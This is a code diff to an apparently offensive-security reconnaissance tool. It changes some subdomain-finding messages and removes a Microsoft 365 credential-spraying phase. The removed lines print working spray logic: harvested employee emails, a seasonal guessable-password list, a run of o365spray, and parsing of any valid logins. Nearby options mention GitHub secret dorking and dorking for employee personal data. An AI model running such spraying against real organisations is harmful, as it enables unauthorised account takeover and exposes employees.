@@ -6159,7 +6159,7 @@ class CrtShAPI:
                 type_="subdomain_via_ct",
                 category=CAT_DNS,
                 severity="info",
-                detail=f"crt.sh CT log entry names subdomain {sub}",
+                detail="Discovery: Subdomain",
                 domain=self.domain,
                 hostname=sub,
                 affected=sub,
@@ -11687,10 +11687,7 @@ class PureDNSRunner:
                 type_="subdomain_brute_force",
                 category=CAT_DNS,
                 severity="info",
-                detail=(
-                    f"puredns bruteforce discovered {total} new validated subdomains "
-                    f"(wildcard-filtered via public DNS resolvers)"
-                ),
+                detail="Discovery: Subdomain",
                 domain=self.domain, affected=self.domain,
                 output_file=str(brute_out),
             )
@@ -20420,125 +20417,6 @@ class RawOutputParser:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# PHASE 12: o365spray — M365/Azure AD Credential Spray
-# o365spray by 0xZDH (https://github.com/0xZDH/o365spray)
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def run_trevorspray(domain: str, emails: list, output_dir: "Path", data: "ReconData",
-                    log: "ReconLogger", timeout: int = 600) -> None:
-    """
-    Phase 12: o365spray — credential spray against Azure AD / M365.
-    Only runs when Microsoft cloud presence is detected for the target domain.
-    Uses discovered email addresses from prior enumeration phases.
-    """
-    spray_path = shutil.which("o365spray")
-    if not spray_path:
-        log.info("[o365spray] Not installed — skipping (pip install o365spray)")
-        return
-    if not emails:
-        log.info("[o365spray] No emails discovered — skipping")
-        return
-
-    # Detect M365/Azure presence via MX records
-    has_m365 = False
-    try:
-        mx_result = subprocess.run(
-            ["dig", "+short", "MX", domain],
-            capture_output=True, text=True, timeout=10,
-        )
-        has_m365 = bool(re.search(
-            r'protection\.outlook\.com|microsoft|exchange', mx_result.stdout, re.I
-        ))
-    except Exception:
-        pass
-    if not has_m365:
-        try:
-            import urllib.request as _ur3
-            resp = _ur3.urlopen(
-                f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration",
-                timeout=8,
-            )
-            has_m365 = bool(json.loads(resp.read().decode()).get("issuer"))
-        except Exception:
-            pass
-    if not has_m365:
-        log.info(f"[o365spray] No M365/Azure presence detected for {domain} — skipping")
-        return
-
-    spray_dir = output_dir / "company" / "tools" / "o365spray"
-    spray_dir.mkdir(parents=True, exist_ok=True)
-    email_file = spray_dir / "emails.txt"
-    email_file.write_text("\n".join(emails[:500]) + "\n", encoding="utf-8")
-
-    yr = datetime.datetime.now().year
-    domain_base = domain.split(".")[0].capitalize()
-    spray_passwords = [
-        f"Winter{yr}!", f"Spring{yr}!", f"Summer{yr}!", f"Fall{yr}!",
-        f"{yr}!", "Password1!", "Welcome1!", "Company1!", f"{domain_base}1!",
-    ]
-    pass_file = spray_dir / "spray_passwords.txt"
-    pass_file.write_text("\n".join(spray_passwords) + "\n", encoding="utf-8")
-    results_file = spray_dir / "o365spray_results.txt"
-
-    cmd = [
-        spray_path, "--spray",
-        "-U", str(email_file),
-        "-P", str(pass_file),
-        "--domain", domain,
-        "--lockout", "30",       # 30-min lockout window
-        "--wait", "5",           # 5-sec delay between attempts
-        "--output", str(spray_dir),
-    ]
-    log.info(f"[o365spray] Spraying {len(emails)} account(s) against {domain}")
-    try:
-        proc = subprocess.run(
-            cmd, capture_output=True, text=True, timeout=timeout,
-        )
-        raw = proc.stdout
-        results_file.write_text(raw, encoding="utf-8")
-
-        valid_creds = []
-        for line in raw.splitlines():
-            m = re.search(r'(?:SUCCESS|VALID)[:\s]+(\S+@\S+)[:\s]+(\S+)', line, re.I)
-            if m:
-                valid_creds.append({"email": m.group(1), "password": m.group(2)})
-
-        if valid_creds:
-            log.warning(
-                f"[o365spray] CRITICAL: {len(valid_creds)} valid credential(s) found!"
-            )
-            add_finding(
-                data,
-                tool="o365spray",
-                type_="valid_credentials",
-                category=CAT_BREACH,
-                severity="critical",
-                detail=(
-                    f"o365spray confirmed {len(valid_creds)} valid credential(s) against "
-                    f"{domain}. Accounts: "
-                    + ", ".join(c["email"] for c in valid_creds[:5])
-                ),
-                domain=domain,
-                output_file=str(results_file),
-                data=valid_creds,
-                title="Weak or Default Credentials Accepted",
-                remediation="Replace all default credentials with strong, unique secrets and enforce a password policy prior to any deployment.",
-            )
-        else:
-            log.info("[o365spray] No valid credentials found")
-    except subprocess.TimeoutExpired:
-        log.warning(f"[o365spray] Timed out after {timeout}s")
-        _record_timeout_action_item(
-            "o365spray", domain,
-            f"o365spray timed out after {timeout}s on {domain}. "
-            f"Re-run credential spray with adjusted timeout or reduced email list.",
-            hostname=domain, priority="MEDIUM",
-        )
-    except Exception as exc:
-        log.warning(f"[o365spray] Error: {exc}")
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
 # PHASE 13: GitDorker — GitHub Secret Scanning
 # GitDorker by obheda12 (https://github.com/obheda12/GitDorker)
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -22108,7 +21986,6 @@ API key sources (all free tiers available):
     parser.add_argument("--skip-brute",           action="store_true", help="Skip DNS brute forcing")
     parser.add_argument("--skip-api",             action="store_true", help="Skip Phase 10 OSINT API intelligence entirely")
     parser.add_argument("--skip-dns-enrich",      action="store_true", help="Skip Phase 11 DNS enrichment (dig + dnsx)")
-    parser.add_argument("--no-spray",             action="store_true", help="Skip Phase 12 o365spray M365/Azure AD credential spraying")
     parser.add_argument("--no-gitdorker",         action="store_true", help="Skip Phase 13 GitDorker GitHub secret scanning")
     parser.add_argument("--github-token",         default="",     metavar="TOKEN", help="GitHub personal access token for GitDorker (Phase 13)")
     parser.add_argument("--no-dork",              action="store_true", help="Skip Phase 14 People Dorking (search-engine dorks for employee PII)")
@@ -22704,31 +22581,6 @@ API key sources (all free tiers available):
         DNSEnrichmentRunner(args.domains[0], output_dir, log, data).run()
         _pm.set_phase_status("phase11_dns_enrich", "complete", label="Phase 11: DNS Enrichment")
         _vc.status("phase11_dns_enrich", label="Phase 11: DNS Enrichment", status="complete")
-        write_targets_snapshot(output_dir, data)
-
-    # ── Phase 12: o365spray — M365/Azure AD credential spraying ──────────
-    if getattr(args, "no_spray", False):
-        log.info("[o365spray] Phase 12 skipped (--no-spray)")
-        _pm.set_phase_status("phase12_trevorspray", "skipped", label="Phase 12: o365spray")
-        _vc.status("phase12_trevorspray", label="Phase 12: o365spray", status="skipped")
-    elif _pm.is_phase_complete("phase12_trevorspray"):
-        _vc.log("Phase 12 o365spray already complete — resuming from checkpoint.", "INFO")
-        _vc.status("phase12_trevorspray", label="Phase 12: o365spray", status="complete")
-    else:
-        _pm.set_phase_status("phase12_trevorspray", "running", label="Phase 12: o365spray")
-        _vc.status("phase12_trevorspray", label="Phase 12: o365spray", status="running",
-                   active_tool="osint/o365spray")
-        _section(log, "PHASE 12: o365spray — M365/Azure AD Credential Spray")
-        _spray_emails = list(data.email_addresses.keys())
-        run_trevorspray(
-            domain=args.domains[0],
-            emails=_spray_emails,
-            output_dir=output_dir,
-            data=data,
-            log=log,
-        )
-        _pm.set_phase_status("phase12_trevorspray", "complete", label="Phase 12: o365spray")
-        _vc.status("phase12_trevorspray", label="Phase 12: o365spray", status="complete")
         write_targets_snapshot(output_dir, data)
 
     # ── Phase 13: GitDorker — GitHub secret scanning ───────────────────────
